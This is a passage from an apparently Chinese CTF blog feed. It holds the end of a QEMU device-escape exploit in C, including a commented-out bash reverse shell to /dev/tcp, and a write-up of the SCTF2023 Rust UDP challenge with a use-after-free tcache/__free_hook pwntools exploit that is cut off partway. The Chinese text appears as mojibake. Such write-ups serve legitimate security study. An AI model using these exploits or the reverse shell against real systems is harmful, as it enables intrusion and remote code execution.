class="hljs-type">size_t</span> heap_addr;<br>    <span class="hljs-type">size_t</span> elf_base;<br>    iopl(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// leak heap_addr</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-1. leak heap_addr&quot;</span>);<br>    pem_buf = gva_to_gpa(buf);<br>    write_addr(pem_buf);<br>    write_size(<span class="hljs-number">0x400</span>);<br>    set_encode1(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);   <br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x310</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    heap_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x308</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-type">size_t</span> hfdev_addr = heap_addr - <span class="hljs-number">2696</span>;<br>    <span class="hljs-type">size_t</span> time_struct = hfdev_addr + <span class="hljs-number">0x1d40</span>;<br>    <span class="hljs-type">size_t</span> bh_struct = hfdev_addr - <span class="hljs-number">0x101a80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;time_struct_addr_is %#lx\n&quot;</span>, time_struct);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bh_struct_addr_is %#lx\n&quot;</span>, bh_struct);<br>    <br><br>    <span class="hljs-comment">//leak elf_base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-2. leak qemu elf_addr&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x10</span>)) = time_struct;<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x18</span>)) = bh_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    write_time(<span class="hljs-number">8</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x310</span>);<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x308</span>)) = heap_addr ^ time_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">1</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x338</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    <span class="hljs-type">size_t</span> leak_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x330</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is %#lx\n&quot;</span>, leak_addr);<br>    elf_base = leak_addr - <span class="hljs-number">0x381190</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2D6610</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;qemu_elf_base_is %#lx\n&quot;</span>, elf_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-3. hijack time_struct&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    <span class="hljs-type">size_t</span> faker_time_struct_addr = heap_addr + <span class="hljs-number">0x108</span>;<br>    <span class="hljs-type">size_t</span> cmd_addr = faker_time_struct_addr + <span class="hljs-number">0x40</span>;<br>    <span class="hljs-type">size_t</span> faker_time_struct[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    <span class="hljs-comment">//char cmd[0x40] = &quot;/bin/bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.168.184.142/8888 0&gt;&amp;1\&#x27;&quot;;</span><br>    faker_time_struct[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    faker_time_struct[<span class="hljs-number">1</span>] = time_struct - <span class="hljs-number">0x110f360</span>;<br>    faker_time_struct[<span class="hljs-number">2</span>] = system_plt;<br>    faker_time_struct[<span class="hljs-number">3</span>] = cmd_addr;<br>    faker_time_struct[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>    faker_time_struct[<span class="hljs-number">5</span>] = <span class="hljs-number">0x100000000</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span>, faker_time_struct, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span> + <span class="hljs-number">0x40</span>, cmd, <span class="hljs-number">0x40</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x310</span>)) = faker_time_struct_addr ^ time_struct;<br>    set_encode2(<span class="hljs-number">0x318</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br><br>    <span class="hljs-comment">//0x1d40  0x101a80</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sctf2023 Brave Knights and Rusty Swords</title>
    <link href="/2023/06/27/sctf2023/"/>
    <url>/2023/06/27/sctf2023/</url>
    
    <content type="html"><![CDATA[<p>ä¸Šæ¬¡åœ¨aliyunçš„æ¯”èµ›ä¸Šä¹Ÿé‡åˆ°è¿‡rustè¯­è¨€çš„é¢˜ï¼Œä½†æ˜¯é‚£é“rustçš„é¢˜æ˜¯ä¸€é“ä¼ ç»Ÿçš„å †èœå•é¢˜ï¼Œé¢˜ç›®çš„è¾“å…¥è¾“å‡ºå®Œå…¨éƒ½ä¸ç”¨çœ‹idaå°±çŸ¥é“ï¼Œè€Œä¸”åé—¨å‡½æ•°ä¹Ÿç›´æ¥ç»™å‡ºäº†ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥å†™å‡ºæ¥ã€‚è¿™æ¬¡sctfç»™çš„æ˜¯ä¸€ä¸ªupdæœåŠ¡ç¨‹åºï¼Œè¾“å…¥è¾“å‡ºä¹Ÿæ²¡æœ‰ç»™ä½ å¾ˆå¤šä¿¡æ¯ï¼Œè¿™ä¸‹å°±åªèƒ½å»æ‹¿idaå»ç¡¬é€†äº†ï¼ˆğŸ˜­ï¼‰ã€‚</p><p>ç”±äºæ˜¯udpæœåŠ¡ï¼Œncè¿æ¥æ—¶ä½¿ç”¨<code>nc -u 192.168.184.133 8080</code>ã€‚</p><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>é¦–å…ˆçœ‹åˆ°idaä¸­çš„mainå‡½æ•°å¾ˆç®€å•ï¼Œè‚¯å®šä¸æ˜¯é€»è¾‘çš„ä¸»ä½“ï¼Œä½¿ç”¨gdb attachç¨‹åºçš„è¿›ç¨‹åå‘ç°æœ‰server_game::mainå‡½æ•°ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„é€»è¾‘ä¸»ä½“å‡½æ•°ï¼š</p><img src="/img/14/Screenshot 2023-06-27 212845.png" style="zoom:50%;" /><p>ç‚¹è¿›å»å‘ç°æµç¨‹æå…¶å¤æ‚ï¼Œè€Œä¸”å¾ˆå¤šä»£ç å—éƒ½æ˜¯<code>jmp  short $+2</code>ç›¸è¿æ¥çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆrustè¿™æ ·ç¼–è¯‘ï¼ˆæ„Ÿè§‰æ²¡æœ‰è¿™ä¸ªjmpï¼Œç¨‹åºä¹Ÿèƒ½å¾€åç›´æ¥æ‰§è¡Œç›¸åº”çš„ä»£ç å—ï¼‰</p><img src="/img/14/Screenshot 2023-06-27 214212.png"><p>ä¼ªä»£ç å°±æ›´ä¸ç”¨è¯´äº†ï¼Œä¹Ÿä¸æ˜¯ç‰¹åˆ«å¥½çœ‹ï¼Œæœ‰å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°ï¼Œä¸è¿‡è¿™é‡Œé‡ç‚¹å…³æ³¨<code>UdpSocket::recv_from</code>ï¼Œå› ä¸ºç”¨æˆ·å°±æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥ä¼ é€’æ•°æ®ç»™ç¨‹åºçš„ï¼Œè€Œè¯¥udpæœåŠ¡æ˜¯ä¸æ–­æ¥æ”¶å‘½ä»¤å¾ªç¯çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆæ­¥å®šä½åˆ°å¦‚ä¸‹ä¼ªä»£ç ï¼š</p><img src="/img/14/Screenshot 2023-06-28 120409.png"><p>â€‹                               </p><h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°ç¨‹åºæ˜¯æ€æ ·æ¯”è¾ƒçš„å­—ç¬¦ä¸²çš„ï¼Œæˆ‘å½“æ—¶æ˜¯éšä¾¿è¾“å…¥ä¸€æ®µå­—ç¬¦ï¼Œç„¶åä½¿ç”¨gdbå®šä½åˆ°<code>UdpSocket::send_to</code>å‡½æ•°ï¼Œè¿™æ—¶æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½åˆ¤æ–­å¤±è´¥çš„æƒ…å†µï¼š</p><img src="/img/14/Screenshot 2023-06-27 221618.png" style="zoom: 50%;" /><p>æ¥ä¸‹æ¥ä½¿ç”¨idaä»å®šä½åˆ°<code>UdpSocket::send_to</code>å‡½æ•°è‡ªä¸‹å¾€ä¸Šæ‰¾åˆ¤æ–­åˆ†æ”¯çš„ä»£ç å—ï¼š</p><img src="/img/14/Screenshot 2023-06-27 222735.png"><p>æœ€åå‘ç°æ‰€æœ‰çš„åˆ¤æ–­åˆ†æ”¯çš„ä»£ç å—éƒ½æ˜¯å¦‚ä¸‹æ ¼å¼ï¼Œä¸­é—´çš„é‚£ä¸ªå‡½æ•°ä¼°è®¡å°±æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„ï¼Œè€Œå­—ç¬¦ä¸²åœ°å€å°±æ˜¯åœ¨rdxä¸­ï¼Œecxå°±æ˜¯å­—ç¬¦ä¸²é•¿åº¦ï¼š</p><img src="/img/14/Screenshot 2023-06-27 223650.png"><p>è¿›ä¸€æ­¥æŸ¥çœ‹byte_E64F1åœ°å€ä¸­çš„å†…å®¹å°±å¯ä»¥çŸ¥é“æ¯”è¾ƒçš„å­—ç¬¦ä¸²äº†</p><img src="/img/14/Screenshot 2023-06-27 224141.png" style="zoom: 50%;" /><p>â€‹                                 </p><p>æœ€åæˆ‘å‘ç°å…¶å®åªæœ‰å†å°†ä¸Šé¢å®šä½åˆ°çš„ä¼ªä»£ç æ®µå¾€ä¸‹å¤šç¿»å‡ è¡Œå°±å¯ä»¥çœ‹åˆ°ifåæœ‰ä¸ªcmpå­—æ ·çš„å‡½æ•°ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸ªå°±æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œä¸ç”¨ä¸Šé¢é‚£ä¹ˆéº»çƒ¦ï¼ˆğŸ§ï¼‰</p><img src= "/img/14/Screenshot 2023-06-27 224513.png"><p>â€‹                              </p><p>æœ€åå¯ä»¥å¾—åˆ°æ¯”è¾ƒçš„å­—ç¬¦ä¸²ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">login <br>register <br>purchase <br>fight <br>draw_000001 <br>draw_011214 <br>show_infomation <br>Data_testing_console <br>write_signature<br></code></pre></td></tr></table></figure><p>â€‹                                               </p><h4 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h4><p>çŸ¥é“è¾“å…¥ä»€ä¹ˆå‘½ä»¤ï¼Œæ¥ä¸‹æ¥å°±å®¹æ˜“å¤šäº†ã€‚</p><p>loginå‘½ä»¤çš„æ ¼å¼æ˜¯ç»™æç¤ºçš„ï¼Œå¯ä»¥ç›´æ¥ç±»æ¯”åˆ°registerå‘½ä»¤ã€‚</p><p>purchaseæ˜¯ç”¨å¾—åˆ°çš„100 currencyå»ä¹°å¡ã€‚</p><p>draw_000001å’Œdraw_011214å»æŠ½heroã€‚</p><p>fightæ˜¯å»æ‰“æ€ªå‡çº§ï¼Œå‡åˆ°10çº§è¿™ä¸ªæ¸¸æˆå°±ç®—æ˜¯èµ¢äº†ã€‚</p><p>Data_testing_consoleåªæœ‰åœ¨fightå®Œè¿™ä¸ªæ¸¸æˆåæ‰èƒ½ä½¿ç”¨ã€‚</p><p>fightçš„æ¸¸æˆèµ¢äº†ä¹‹åå¹¶æ²¡æœ‰ä»€ä¹ˆå»æ‰§è¡Œæ¼æ´ä»£ç å—çš„å¥–åŠ±ï¼Œæ¥ä¸‹æ¥å°±åªèƒ½å»çœ‹çœ‹Data_testing_consoleäº†ã€‚</p><p>è¿›å…¥Data_testing_consoleå‘½ä»¤ï¼Œä¸€å¼€å§‹å°±æç¤ºæˆ‘ä»¬<code>Enter function name:</code>ï¼ŒæŸ¥çœ‹<code>server_game::Data_testing_console</code>å‡½æ•°çš„ä¼ªä»£ç ï¼Œè¿™é‡Œçœ‹ä¼ªä»£ç ä¹Ÿæ˜¯åªçœ‹<code>UdpSocket::recv_from</code>å’Œ<code>UdpSocket::send_to</code>å‡½æ•°é™„è¿‘çš„ã€‚å‘ç°åœ¨è¯¥å‡½æ•°ä¸­<code>UdpSocket::send_to</code>åªè°ƒç”¨è¿‡ä¸€æ¬¡ï¼Œå‘é€æ¥ä¸‹æ¥çš„å­—ç¬¦ä¸²<code>Enter the command:</code>ï¼Œä½¿ç”¨gdb attachä¸€ä¸‹è¿›ç¨‹å‘ç°è¯¥è¿‡ç¨‹æ˜¯åœ¨<code>server_game::Memory_Debug_console</code>å‡½æ•°ä¸­ï¼ˆå¸¦server_gameå­—æ®µçš„å‡½æ•°éƒ½éœ€è¦çœ‹çœ‹ ğŸ˜«ï¼‰</p><img src="/img/14/Screenshot 2023-06-27 231805.png" style="zoom: 50%;" /><p>æŸ¥çœ‹<code>server_game::Memory_Debug_console</code>å‡½æ•°ä¼ªä»£ç å‘ç°æœ‰libcå­—æ®µ</p><img src="/img/14/Screenshot 2023-06-27 231914.png" style="zoom: 80%;" /><p>è”æƒ³åˆ°function nameè¾“å…¥readåå‘ç°ç›´æ¥ä¼ å›äº†readå‡½æ•°libcåœ°å€</p><img src="/img/14/Screenshot 2023-06-27 234719.png"><p>å‰©ä¸‹çš„è¾“å…¥å‘½ä»¤å°±ä½¿ç”¨å’Œpart2ä¸€æ ·çš„åŠæ³•æ‰¾åˆ°å‘½ä»¤å­—æ®µä¸ºdata_pushå’Œquit</p><p>â€‹                                                         </p><h4 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h4><p>è¾“å…¥quitå°±æ˜¯é€€å‡ºæ²¡ä»€ä¹ˆå¯è¯´çš„ï¼Œè¾“å…¥data_pushååˆä¼šè¿›å…¥ä¸€ä¸ª<code>server_game::data_push</code>å‡½æ•°ï¼Œä¹Ÿæ˜¯ç”¨å‰é¢çš„æ–¹æ³•æ‰¾åˆ°operationå­—æ®µpushå’Œgrowã€‚è¾“å…¥ä¸åŒçš„operationæ¥ç€éƒ½ä¼šæœ‰ä¸€ä¸ªvector numberå»ç”¨switchåˆ¤æ–­ï¼Œæœ€åè¾“å…¥ä¸€ä¸ªvalueã€‚</p><p>pushå’Œgrowï¼Œå®ƒä»¬switchçš„caseä¸­ä»£ç æ®µå¤§è‡´ç›¸åŒã€‚</p><p>å°±ä¼ªä»£ç è€Œè¨€è‡ªå·±å®Œå…¨æ— æ³•çŸ¥é“å“ªäº›å‡½æ•°æ˜¯éœ€è¦é‡ç‚¹å…³æ³¨çš„ï¼Œåªèƒ½ä½¿ç”¨gdbä¸€æ­¥ä¸€æ­¥å»è°ƒè¯•ï¼Œè°ƒè¯•çš„æ—¶å€™æ³¨æ„è¾“å…¥çš„valueï¼Œå¦‚æœæ˜¯æŸå‡½æ•°è°ƒç”¨çš„å‚æ•°ä¹Ÿæ˜¯è¯¥valueå°±ä»”ç»†å¯¹æ¯”ä¸€ä¸‹å‡½æ•°å‰åå¯„å­˜å™¨ä»¥åŠ[å¯„å­˜å™¨]å€¼çš„å˜åŒ–ã€‚</p><p>è¿™é‡Œæˆ‘è°ƒè¯•pushæ“ä½œæ—¶è¾“å…¥çš„valueä¸º48ï¼ˆvalueå°½é‡ç‰¹æ®Šä¸€ç‚¹ï¼Œè¿™æ ·ä¾¿äºè§‚å¯Ÿï¼‰ï¼Œæœ€åå®šä½åˆ°ä¸€ä¸ªå¸¦pushå­—æ®µçš„å‡½æ•°</p><img src="/img/14/Screenshot 2023-06-28 001800.png" style="zoom:50%;" /><p>rdiä¸­çš„å€¼å‰åå¯¹æ¯”å¦‚ä¸‹ï¼š</p><img src= "/img/14/Screenshot 2023-06-28 001855.png"><p>â€‹                             </p><img src= "/img/14/Screenshot 2023-06-28 001912.png"><p>å¤šè°ƒè¯•å‡ æ¬¡åå°±å¯ä»¥çŸ¥é“pushçš„æ“ä½œå°±æ˜¯å°†valueä¿å­˜åˆ°æ ˆä¸Šï¼Œvalueä¸èƒ½å¤§äº0x100ï¼Œvalueå°±æ˜¯ä¸€ä¸ªå­—èŠ‚çš„ASCIIç ï¼Œå‰ä¸€ä¸ªå­—æ®µå°±æ˜¯pushæ•°æ®çš„å¤§å°ã€‚</p><p>vector numberå°±æ˜¯å¯ä»¥è®©valueä¿å­˜åˆ°ä¸åŒåŒºåŸŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># vector number = 1æ—¶ï¼Œåœ¨0x95a0 + rsp(server_game::data_pushå‡½æ•°ä¸­çš„æ ˆé¡¶) </span><br><span class="hljs-comment"># vector number = 2æ—¶ï¼Œåœ¨0x96b0 + rsp</span><br><span class="hljs-comment"># vector number = 3æ—¶ï¼Œåœ¨0x97c0 + rsp</span><br><span class="hljs-comment"># æ¯ä¸ªåŒºåŸŸæ­£å¥½ç›¸å·®0x110</span><br></code></pre></td></tr></table></figure><p>â€‹                                         </p><p>è°ƒè¯•growæ“ä½œæ—¶ï¼Œä¹Ÿæ˜¯å®šä½åˆ°ä¸€ä¸ªå¸¦growå­—æ®µçš„å‡½æ•°ï¼š</p><img src="/img/14/Screenshot 2023-06-28 012725.png" style="zoom:50%;" /><p>åŒæ—¶è¯¥å‡½æ•°ä¼ªä»£ç ä¸­çš„æ¯”è¾ƒçš„æ•°æ®å­—æ®µæ„ä¹‰å¦‚ä¸‹ï¼š</p><img src="/img/14/Screenshot 2023-06-28 012544.png"><p>åœ¨æœ€åæœ‰ä¸€ä¸ªå¸¦heapå­—æ®µçš„å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨ä¸reallocå‡½æ•°å‡ ä¹ä¸€æ ·ï¼š</p><img src="/img/14/Screenshot 2023-06-28 012849.png"><p>â€‹               </p><p>æœ€åå‘ç°vector numberçš„ä½œç”¨ä¸pushä¸€æ ·ï¼Œé™¤äº†vector number &#x3D; 2ä»¥å¤–ï¼Œåˆ«çš„vector numberéƒ½åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚</p><p>å½“vector number &#x3D; 2ï¼Œè¾“å…¥çš„valueï¼ˆå¤§äº0x100æ—¶å°±ä½¿ç”¨å †å­˜æ•°æ®ï¼‰ä¸å…ˆå‰çš„valueä¸€æ ·æ—¶è¯¥å †å—å°±ä¼šé‡Šæ”¾ï¼Œä½†æ˜¯æŒ‡é’ˆæœªæ¸…é›¶ï¼Œå¹¶ä¸”ä¾æ—§å¯ä»¥ä½¿ç”¨pushä¼ å…¥æ•°æ®ï¼Œå°±æ˜¯ä¸€ä¸ªuafã€‚</p><p>â€‹                           </p><h4 id="part5"><a href="#part5" class="headerlink" title="part5"></a>part5</h4><p>æ¼æ´åˆ©ç”¨å¾ˆç®€å•ï¼Œlibcçš„åœ°å€æ˜¯ç™½ç»™çš„ï¼Œç›´æ¥åˆ©ç”¨uafæ¥å®ç°tcache attackå»ä¿®æ”¹free_hookï¼Œæœ€ååå¼¹shellã€‚</p><p>æœ€åˆæˆ‘çš„åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">size = <span class="hljs-number">0x1d0</span><br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base))<br>grow(<span class="hljs-number">4</span>, size)<br>grow(<span class="hljs-number">5</span>, size)<br>send_payload(<span class="hljs-number">5</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base))<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨vector number &#x3D; 2æ—¶å¯ä»¥ä½¿ç”¨å¤šæ¬¡ï¼Œå½¢æˆdouble freeåç›´æ¥ä¿®æ”¹tcache nextæŒ‡é’ˆä¸ºfree_hookï¼Œå†åˆ©ç”¨growç”³è¯·åˆ°free_hookï¼Œæœ€åpushæ•°æ®åˆ°free_hookã€‚ä½†æ˜¯å®é™…ä¸Šè¿™æ ·å‘free_hookå†™å…¥æ•°æ®æ˜¯ç›´æ¥æŠ¥é”™çš„ï¼Œå½“pushå®Œç¬¬ä¸€ä¸ªå­—èŠ‚åˆ°free_hookä¸Šåï¼Œæ¥ä¸‹æ¥è°ƒç”¨drop_in_placeå‡½æ•°ï¼š</p><img src="/img/14/Screenshot 2023-06-27 164146.png"><p>æœ€åæœ‰è°ƒç”¨çš„freeçš„åŠŸèƒ½ï¼Œè¿™æ—¶free_hookä¸­ä»…æœ‰å†™å…¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œä½†ä¾æ—§å»è°ƒç”¨free_hookä¸­çš„é”™è¯¯åœ°å€ï¼š</p><img src="/img/14/Screenshot 2023-06-28 015131.png"><p>â€‹                                                                                         </p><p>å½“æ—¶æˆ‘å°±è‡ªé—­äº†ğŸ˜­ï¼Œä¹‹åæˆ‘çœ‹<a href="https://blog.wm-team.cn/index.php/archives/38/#Brave+Knights+and+Rusty+Swords">W&amp;Mçš„wp</a>åæ‰çŸ¥é“pushæ“ä½œä¹Ÿèƒ½ç”³è¯·å †å—ï¼Œåˆšå¼€å§‹ä¸ä½¿ç”¨growï¼Œç›´æ¥pushï¼Œå¦‚æœpushçš„æ•°æ®å¤§äº0x100ä¹Ÿæ˜¯ä¼šç”³è¯·å †ä¸Šçš„å†…å­˜ï¼Œæ”¹ç”¨pushå°±å¯ä»¥è§£å†³ä¸Šé¢çš„é—®é¢˜ã€‚</p><p>â€‹                                     </p><p>æœ€åå®Œæ•´çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;192.168.184.133&#x27;</span>,<span class="hljs-number">8080</span>, typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;server_game&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;register a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Registration successful! You have received 100 currency.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;login a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome back&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;purchase 100&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Purchase successful! You have received 10 cards.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = <span class="hljs-string">b&#x27;&#x27;</span><br>    p.sendline(<span class="hljs-string">b&#x27;fight&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;fight: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;attack&#x27;</span>)<br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> t != <span class="hljs-string">b&#x27;\n&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span 